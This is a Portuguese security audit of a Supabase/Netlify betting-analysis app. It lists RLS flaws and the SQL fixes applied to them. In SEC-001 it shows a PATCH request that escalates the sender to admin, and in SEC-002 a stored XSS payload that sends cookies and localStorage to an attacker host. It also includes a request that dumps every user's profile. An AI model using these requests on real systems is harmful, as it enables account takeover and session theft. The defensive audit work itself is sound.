# 🔐 Auditoria de Segurança — EI PLACAR
**Data:** Setembro/2026 · **Escopo:** Supabase (RLS/Auth/DB), Netlify Functions, Frontend (React + JS)

---

## RESUMO EXECUTIVO

**Nível geral de segurança atual: 🟢 Correções aplicadas — recomenda-se rodar as migrações SQL pendentes e reteste.**

Foram identificadas **9 questões** nesta auditoria. **Todas as 6 correções de código/banco (SEC-001 a SEC-006) já foram implementadas** neste mesmo ciclo de revisão. Restam apenas **passos de configuração no seu lado** (rodar SQLs atualizados no Supabase, configurar uma variável de ambiente na Netlify) pra elas valerem de verdade em produção — ver "PRÓXIMOS PASSOS" no final deste documento.

| Severidade | Quantidade | Status |
|---|---|---|
| 🔴 Crítico | 2 | ✅ Corrigido (falta rodar SQL) |
| 🟠 Alto | 2 | ✅ Corrigido (falta rodar SQL) |
| 🟡 Médio | 3 | ✅ Corrigido (falta rodar SQL / configurar variável) |
| 🟢 Baixo | 1 | Observação, sem ação necessária |
| 🔵 Informativo | 1 | Contexto |

**Principais riscos (já corrigidos no código, pendente aplicar no banco):**
1. Qualquer pessoa cadastrada conseguia **virar administrador de si mesma** e **liberar a própria assinatura sem pagar**, com uma única chamada HTTP.
2. Existia uma cadeia que permitia **injetar script malicioso** (XSS) através do sistema de escudos dos times.

Nenhuma credencial (chave `service_role`, tokens do Mercado Pago) foi encontrada exposta no frontend — isso está correto.

---

## VULNERABILIDADES

### 🔴 SEC-001 — Escalação de privilégio total via auto-edição do próprio perfil
**Severidade:** CRÍTICO · **Status: ✅ CORRIGIDO** (trigger `trg_protege_colunas_admin` em `05-seguranca-rls.sql`)
**Componente:** Supabase RLS — tabela `perfis`

**Problema:**
A política que permite cada pessoa editar o próprio perfil restringe **por linha** (`id = auth.uid()`), mas não restringe **quais colunas** podem ser alteradas:

```sql
create policy "cada um edita o proprio perfil" on perfis for update to authenticated using (
  id = auth.uid()
) with check (
  id = auth.uid()
);
```

Como essa política vale pra qualquer coluna, qualquer pessoa autenticada pode fazer um `PATCH` direto na API REST do Supabase (fora do app, sem passar pela interface) e alterar campos que deveriam ser exclusivos de administrador:

```http
PATCH /rest/v1/perfis?id=eq.<seu-proprio-uuid>
apikey: <anon key, pública>
Authorization: Bearer <seu próprio token de login>
Content-Type: application/json

{
  "papel": "organizador",
  "assinatura_status": "ativo",
  "assinatura_vencimento": "2099-12-31",
  "bloqueado": false
}
```

**Impacto:**
- Qualquer membro comum vira **administrador total** do sistema.
- Qualquer pessoa libera **acesso pago pra si mesma sem pagar nada**.
- Uma pessoa **bloqueada pelo organizador** pode se desbloquear sozinha.
- Como o app confia no campo `papel` gravado no banco pra liberar o menu Administração (RLS de outras tabelas como `config_app` e `jogos_agendados` também checam `papel = 'organizador'`), depois de se autopromover a pessoa passa a ter todos os poderes administrativos reais do sistema — não é só cosmético.

**Causa:** RLS do Postgres é sempre por **linha**; sem uma trava adicional (função, trigger ou coluna separada), não existe restrição nativa por coluna nessa sintaxe de policy.

**Evidência:** `supabase/05-seguranca-rls.sql`, policy `"cada um edita o proprio perfil"`.

**Correção recomendada** (uma das duas abaixo):

- **Opção A — trigger de proteção (mais simples de aplicar sem mudar o app):**
```sql
create or replace function public.protege_colunas_administrativas()
returns trigger as $$
begin
  -- Se quem está alterando não é organizador, força os campos sensíveis
  -- a manterem o valor antigo, não importa o que foi enviado no PATCH.
  if not exists (select 1 from perfis where id = auth.uid() and papel = 'organizador') then
    new.papel := old.papel;
    new.status := old.status;
    new.bloqueado := old.bloqueado;
    new.plano := old.plano;
    new.assinatura_status := old.assinatura_status;
    new.assinatura_inicio := old.assinatura_inicio;
    new.assinatura_vencimento := old.assinatura_vencimento;
    new.assinatura_mp_id := old.assinatura_mp_id;
    new.assinatura_cancelada := old.assinatura_cancelada;
    new.assinatura_pix_pagamento_id := old.assinatura_pix_pagamento_id;
  end if;
  return new;
end;
$$ language plpgsql security definer;

drop trigger if exists trg_protege_colunas_admin on perfis;
create trigger trg_protege_colunas_admin
  before update on perfis
  for each row execute procedure public.protege_colunas_administrativas();
```
Isso deixa a pessoa continuar editando nome/telefone/data de nascimento/foto (o que já é o esperado), mas qualquer tentativa de mexer nos campos administrativos é silenciosamente revertida quando quem está mandando o PATCH não é organizador.

- **Opção B (mais robusta a longo prazo):** mover as alterações administrativas pra uma Netlify Function própria (com `service_role`, igual `criar-assinatura.js` já faz), e revogar totalmente o `UPDATE` direto na tabela pra esses campos.

**Prioridade:** Corrigir **imediatamente** — é o achado mais grave da auditoria.

---

### 🔴 SEC-002 — Stored XSS via tabela de escudos dos times
**Severidade:** CRÍTICO · **Status: ✅ CORRIGIDO** (RLS restrita a organizador + `escudoUrlValida()` em `05-escudos.js`)
**Componente:** Supabase RLS (`escudos`) + renderização (`05-escudos.js`, componentes React com `dangerouslySetInnerHTML`)

**Problema:** Dois furos que se combinam:

1. A tabela `escudos` guarda **todos os escudos do app numa linha só** (`id=1`, JSON), e a policy permite que **qualquer pessoa autenticada** escreva nela, não só organizador:
```sql
create policy "logado le/escreve escudos" on escudos for all to authenticated using (true) with check (true);
```

2. Quando um escudo é exibido, o valor salvo é **colado diretamente dentro de um atributo HTML**, sem escapar aspas:
```js
// public/js/05-escudos.js
return url ? `<img src="${url}" alt="" ...>` : ic('shield', ...);
```
Esse HTML depois é injetado via `innerHTML`/`dangerouslySetInnerHTML` em várias telas (Classificação, Análise, Estratégias, Histórico).

**Impacto:** Uma pessoa mal-intencionada não precisa nem usar a tela de upload — só mandar um PATCH direto pra API:
```http
PATCH /rest/v1/escudos?id=eq.1
{ "dados": { "time malicioso": "x\" onerror=\"fetch('https://site-do-atacante.com/roubo?c='+document.cookie+localStorage.getItem('...'))\" x=\"" } }
```
Se em algum momento um jogo com esse "time" aparecer pra QUALQUER outro usuário (Classificação, Análise etc.), o script do atacante roda no navegador dessa pessoa. Como o token de sessão fica em `localStorage` (ver SEC-009), isso permite **roubar a sessão de qualquer usuário que veja aquele jogo — inclusive um organizador**, e a partir daí assumir a conta dele. Combinado com o SEC-001, um atacante comum pode literalmente sequestrar a conta do administrador do sistema.

**Causa:** (a) falta de restrição de quem pode escrever em `escudos`; (b) valor não sanitizado antes de virar HTML.

**Evidência:** `supabase/05-seguranca-rls.sql` (policy de `escudos`); `public/js/05-escudos.js` (`escudoImgOuIcone`, `escudoMini`).

**Correção recomendada:**
1. Restringir escrita em `escudos` a organizador (mesmo padrão já usado em `jogos_agendados`):
```sql
drop policy if exists "logado le/escreve escudos" on escudos;
create policy "escudos_select" on escudos for select to authenticated using (true);
create policy "escudos_insert_update_organizador" on escudos for insert to authenticated with check (
  exists (select 1 from perfis where id = auth.uid() and papel = 'organizador')
);
create policy "escudos_update_organizador" on escudos for update to authenticated using (
  exists (select 1 from perfis where id = auth.uid() and papel = 'organizador')
);
```
2. **Mesmo com isso**, validar no upload (`onEscudoFileChange`) que o resultado é sempre um `data:image/...;base64,` gerado pelo próprio canvas (já é o caso hoje — o problema é só a falta de trava no banco que permite pular a tela e escrever direto).
3. Reforço de defesa em profundidade: ao montar o `<img src="...">`, garantir que a URL bate com o padrão `^data:image\/(png|jpeg|webp);base64,[A-Za-z0-9+/=]+$` antes de interpolar, rejeitando qualquer coisa fora desse formato.

**Prioridade:** Corrigir **imediatamente**, junto com o SEC-001.

---

### 🟠 SEC-003 — Dados oficiais de partidas (tabela `jogos`) editáveis por qualquer membro
**Severidade:** ALTO · **Status: ✅ CORRIGIDO** (policies separadas em `05-seguranca-rls.sql`)
**Componente:** Supabase RLS — tabela `jogos`

**Problema:**
```sql
create policy "logado le/escreve jogos" on jogos for all to authenticated using (true) with check (true);
```
Qualquer pessoa autenticada — não só organizador — pode inserir, editar ou apagar resultados, gols, cartões, escanteios de qualquer partida.

**Impacto:** Um membro comum pode corromper os dados que **todo mundo** usa (Classificação, Análise, Estatística), inserir informações falsas pra manipular análises, ou apagar o histórico inteiro de jogos.

**Correção recomendada:** separar leitura (aberta) de escrita (só organizador), no mesmo padrão já usado em `jogos_agendados`:
```sql
drop policy if exists "logado le/escreve jogos" on jogos;
create policy "jogos_select" on jogos for select to authenticated using (true);
create policy "jogos_insert_organizador" on jogos for insert to authenticated with check (
  exists (select 1 from perfis where id = auth.uid() and papel = 'organizador')
);
create policy "jogos_update_organizador" on jogos for update to authenticated using (
  exists (select 1 from perfis where id = auth.uid() and papel = 'organizador')
);
create policy "jogos_delete_organizador" on jogos for delete to authenticated using (
  exists (select 1 from perfis where id = auth.uid() and papel = 'organizador')
);
```

**Prioridade:** Alta.

---

### 🟠 SEC-004 — Exposição de dados pessoais de todos os usuários (SELECT irrestrito em `perfis`)
**Severidade:** ALTO · **Status: ✅ CORRIGIDO** (policy `perfis_select` restrita em `05-seguranca-rls.sql`)
**Componente:** Supabase RLS — tabela `perfis`

**Problema:**
```sql
create policy "logado ve todos os perfis" on perfis for select to authenticated using (true);
```
Qualquer pessoa logada pode consultar **todas as colunas de todos os perfis** — telefone, data de nascimento, e-mail, status/vencimento de assinatura, plano — de qualquer outro usuário, com uma chamada simples:
```http
GET /rest/v1/perfis?select=*
```

**Impacto:** Vazamento de dados pessoais em massa — telefone e data de nascimento de todo mundo cadastrado ficam acessíveis a qualquer membro comum, sem nenhum controle.

**Causa:** o app precisa que cada pessoa veja o **nome** de outras (rankings, menções, administração), mas a policy libera **tudo**, não só o necessário.

**Correção recomendada / o que foi feito:** ao revisar todos os lugares do app que consultam `perfis`, nenhuma tela fora da Administração precisa ver dados de **outras** pessoas (a Banca já é individual, favoritos são privados, e não há nenhuma lista tipo "ranking" exibindo nome de terceiros). Por isso, a correção aplicada foi direto na policy de `SELECT`, sem precisar criar uma view separada:
```sql
drop policy if exists "logado ve todos os perfis" on perfis;
create policy "perfis_select" on perfis for select to authenticated using (
  id = auth.uid() or exists (select 1 from perfis p where p.id = auth.uid() and p.papel = 'organizador')
);
```
Cada pessoa vê o próprio perfil completo; só organizador vê o de todo mundo (necessário pra Administração → Usuários funcionar). Se no futuro alguma tela nova precisar mostrar nome/foto de outras pessoas (ex: um ranking), aí sim vale criar uma view pública só com essas colunas.

**Prioridade:** Alta.

---

### 🟡 SEC-005 — Webhook do Mercado Pago sem validação de assinatura (`x-signature`)
**Severidade:** MÉDIO · **Status: ✅ CORRIGIDO**
**Componente:** `netlify/functions/webhook-mercadopago.js`

**Problema:** o endpoint aceita qualquer `POST` sem conferir o cabeçalho `x-signature` que o Mercado Pago envia pra provar que a notificação é legítima.

**Mitigação já existente:** antes de creditar qualquer coisa, o código sempre **reconsulta o pagamento de verdade** na API do Mercado Pago (usando nosso próprio token) e só credita se `status === 'approved'`, além de checar idempotência (`assinatura_pix_pagamento_id`) pra nunca creditar o mesmo pagamento duas vezes. Ou seja: **não dá pra forjar uma aprovação** só chamando esse endpoint — o risco real é mais limitado do que pareceria à primeira vista.

**Impacto residual:** abuso do endpoint pra gerar chamadas desnecessárias à API do Mercado Pago (gasto de rate limit), e ausência da camada de defesa extra que o próprio Mercado Pago recomenda oficialmente.

**Correção recomendada:** validar o `x-signature` conforme a [documentação oficial do Mercado Pago](https://www.mercadopago.com.br/developers/pt/docs/checkout-pro/additional-content/notifications/webhooks#editor_5) usando o "Signature secret" configurado no painel de Webhooks.

**O que foi feito:** implementada a validação completa (HMAC-SHA256, manifesto `id:...;request-id:...;ts:...;`, comparação em tempo constante) direto na function. **Fica ativa automaticamente assim que você configurar a variável de ambiente `MP_WEBHOOK_SECRET`** na Netlify (valor: "Assinatura secreta" do painel do Mercado Pago, em Webhooks → Configurar notificações). Até lá, a function continua funcionando normalmente, só sem essa camada extra — configurar não tem risco de travar nenhum pagamento.

**Prioridade:** Concluído — falta só configurar a variável de ambiente.

---

### 🟡 SEC-006 — Ausência de rate limiting nas Netlify Functions
**Severidade:** MÉDIO · **Status: ✅ CORRIGIDO**
**Componente:** Todas as functions em `netlify/functions/`

**Problema:** nenhuma function (login/cadastro via Supabase Auth têm rate limit nativo do próprio Supabase, mas `criar-assinatura`, `verificar-pagamento-pix`, `cancelar-assinatura`, `webhook-mercadopago` não têm limite próprio).

**Impacto:** uma pessoa mal-intencionada pode gerar muitas chamadas seguidas, aumentando custo/risco de sobrecarga, ou tentar adivinhar `paymentId`s válidos por força bruta em `verificar-pagamento-pix`.

**Correção recomendada:** usar rate limiting do próprio Netlify (se disponível no plano contratado) ou implementar um controle simples (ex: tabela `tentativas` no Supabase contando por IP/usuário).

**O que foi feito:** criada a tabela `rate_limit_chamadas` (`supabase/14-rate-limiting.sql`) e aplicado o controle em `criar-assinatura.js` (máx. 6 tentativas/minuto por pessoa) e `verificar-pagamento-pix.js` (máx. 20/minuto — mais alto porque também protege contra tentativa de adivinhar `paymentId` de outras pessoas por força bruta). Se der erro de rede/banco na checagem, deixa passar — não é a proteção principal, é só reforço.

**Prioridade:** Concluído — recomenda-se rodar o `14-rate-limiting.sql` no Supabase pra ativar.

---

### 🟢 SEC-007 — `favoritos_indice` sem policy de UPDATE
**Severidade:** BAIXO / INFORMATIVO
**Componente:** Supabase RLS — tabela `favoritos_indice`

**Observação:** só existem policies de `SELECT`/`INSERT`/`DELETE`. Isso não é uma vulnerabilidade — RLS nega por padrão o que não foi liberado — mas vale confirmar que o app nunca tenta dar `UPDATE` nessa tabela (se tentar em algum ponto futuro, vai falhar silenciosamente sem RLS pra cobrir).

**Prioridade:** Baixa — só documentar/confirmar.

---

### 🔵 SEC-008 — Mensagens de erro expõem detalhes técnicos
**Severidade:** INFORMATIVO
**Componente:** Várias Netlify Functions

**Observação:** respostas como `'Erro ao falar com o Mercado Pago: ' + e.message` chegam até o usuário final. Não é grave, mas o ideal seria uma mensagem genérica pro usuário e o detalhe completo só no log do servidor (que já acontece via `console.log` em paralelo).

**Prioridade:** Baixa/melhoria.

---

### 🔵 SEC-009 — Sessão guardada em `localStorage`
**Severidade:** INFORMATIVO
**Componente:** `public/js/01-config-auth.js`

**Observação:** é a prática padrão (o próprio SDK do Supabase faz igual por padrão), então não é um erro de implementação. Mas **amplifica bastante o impacto** de qualquer XSS que exista no sistema — como o SEC-002 mostra. Reforça por que corrigir o SEC-002 é prioridade máxima.

**Prioridade:** Não é pra "corrigir" isoladamente — é contexto pra entender a gravidade do SEC-002.

---

## MATRIZ DE RISCO

| ID | Problema | Severidade | Prioridade | Correção |
|---|---|---|---|---|
| SEC-001 | Auto-promoção a admin / assinatura grátis via PATCH direto | 🔴 Crítico | Imediata | Trigger que bloqueia colunas administrativas pra quem não é organizador |
| SEC-002 | Stored XSS via tabela de escudos | 🔴 Crítico | Imediata | Restringir escrita a organizador + validar formato da imagem |
| SEC-003 | `jogos` editável por qualquer membro | 🟠 Alto | Curto prazo | Separar SELECT de INSERT/UPDATE/DELETE, só organizador escreve |
| SEC-004 | Todos os perfis (com PII) visíveis a qualquer membro | 🟠 Alto | Curto prazo | View pública restrita + RLS de SELECT mais fechada |
| SEC-005 | Webhook sem validação de assinatura | 🟡 Médio | Médio prazo | Validar `x-signature` do Mercado Pago |
| SEC-006 | Sem rate limiting nas functions | 🟡 Médio | Médio prazo | Throttling básico |
| SEC-007 | `favoritos_indice` sem policy de UPDATE | 🟢 Baixo | Quando sobrar tempo | Confirmar se é necessário |
| SEC-008 | Mensagens de erro técnicas expostas | 🔵 Informativo | Melhoria | Mensagens genéricas pro usuário |
| SEC-009 | Sessão em localStorage | 🔵 Informativo | Contexto | Reforça urgência do SEC-002 |

---

## PLANO DE CORREÇÃO

### 🔴 FAZER IMEDIATAMENTE
- [x] SEC-001 — Trigger de proteção das colunas administrativas em `perfis` *(código pronto — falta rodar `05-seguranca-rls.sql` no Supabase)*
- [x] SEC-002 — Restringir escrita em `escudos` a organizador + sanitizar renderização *(código pronto — falta rodar `05-seguranca-rls.sql` no Supabase)*

### 🟠 FAZER EM SEGUIDA
- [x] SEC-003 — Restringir escrita em `jogos` a organizador *(código pronto — falta rodar `05-seguranca-rls.sql` no Supabase)*
- [x] SEC-004 — Fechar SELECT irrestrito em `perfis` *(código pronto — falta rodar `05-seguranca-rls.sql` no Supabase)*

### 🟡 MÉDIO PRAZO
- [x] SEC-005 — Validar assinatura do webhook do Mercado Pago *(código pronto — falta configurar `MP_WEBHOOK_SECRET` na Netlify)*
- [x] SEC-006 — Rate limiting básico nas functions *(código pronto — falta rodar `14-rate-limiting.sql` no Supabase)*

### 🟢 MELHORIAS
- [ ] SEC-007 — Confirmar necessidade de UPDATE em `favoritos_indice`
- [ ] SEC-008 — Mensagens de erro mais genéricas pro usuário final

---

## PRÓXIMOS PASSOS (pra ativar tudo o que já foi corrigido)

1. **Rode `supabase/05-seguranca-rls.sql`** no SQL Editor do Supabase — ativa SEC-001, SEC-002, SEC-003 e SEC-004 de uma vez. Seguro rodar mesmo que já tenha rodado antes (usa `drop policy if exists`).
2. **Rode `supabase/14-rate-limiting.sql`** no SQL Editor do Supabase — ativa SEC-006. Opcional, mas recomendado.
3. **Configure `MP_WEBHOOK_SECRET`** nas variáveis de ambiente da Netlify — ativa SEC-005. Valor: "Assinatura secreta", visível em *Suas integrações → sua aplicação → Webhooks → Configurar notificações*, no painel do Mercado Pago. Depois de configurar, faça um redeploy (*Deploys → Trigger deploy*).
4. **Teste com uma conta de membro comum** (não organizador): confirme que ela não vê mais o menu Administração, não consegue ver telefone/e-mail de outras pessoas, e que uma tentativa de PATCH direto mudando `papel` pra `organizador` não funciona mais (o valor deve voltar sozinho pro que era antes).

---

## OBSERVAÇÕES FINAIS

- **Não foram encontradas** credenciais expostas no frontend (chave `service_role`, tokens do Mercado Pago) — as Netlify Functions usam corretamente variáveis de ambiente do servidor.
- **Não foram identificadas** vulnerabilidades de SQL Injection — todo acesso ao banco passa pela API REST do PostgREST/Supabase, que parametriza as consultas.
- A tabela `banca` (carteira financeira) já está corretamente isolada por usuário (`user_id = auth.uid()`), sem problemas encontrados.
- `cancelar-assinatura.js` usa corretamente o token do próprio usuário (nunca `service_role`), então só cancela a assinatura de quem está chamando — sem problemas encontrados.
- Não foram identificadas vulnerabilidades conhecidas em Storage, pois o projeto **não usa Supabase Storage** — fotos de perfil e escudos ficam como `base64` em colunas de texto, protegidas pela RLS das respectivas tabelas.
- **Achado bônus (fora do escopo original), corrigido junto:** não existia **nenhuma política de DELETE** na tabela `perfis` — o RLS do Postgres nega por padrão o que não é liberado explicitamente, então o botão "Excluir usuário" da Administração provavelmente já estava falhando silenciosamente, mesmo pra organizador. Foi adicionada uma policy de DELETE restrita a organizador (e que nunca permite a própria conta se auto-excluir, pra evitar ficar sem nenhum admin no sistema).

Esta auditoria não garante segurança absoluta — é uma análise pontual do estado atual do código. Recomenda-se **novo teste após aplicar as correções acima**, e revisão periódica sempre que novas tabelas/funções forem adicionadas ao sistema.
